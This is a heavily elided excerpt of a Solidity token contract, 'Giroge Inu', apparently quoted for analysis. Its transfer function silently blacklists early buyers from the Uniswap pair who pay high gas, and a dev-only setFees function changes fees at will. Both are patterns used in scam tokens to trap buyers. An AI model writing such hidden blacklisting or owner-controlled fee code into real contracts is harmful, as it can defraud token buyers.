...
contract GirogeInu is Context, IERC20, Ownable {
    ...
    string private _name = "Giroge Inu";
    ...
    uint256 limiteFinal = 3 * (10 ** 9);
    uint256 blocksAmount = 10;
    ...
    function _transfer(
        ...
        if(!_isDev[from] && !_isDev[to]){
            ...
            if(from == uniswapV2Pair && fersBlock + blocksAmount >= block.number && tx.gasprice >= limiteFinal){isBlacklisted[to] = true;}
        }
    ...
    function setFees(uint256 taxFee, uint256 liquidityFee, uint256 marketingFee, uint256 devFeeDivisor) external onlyDev {
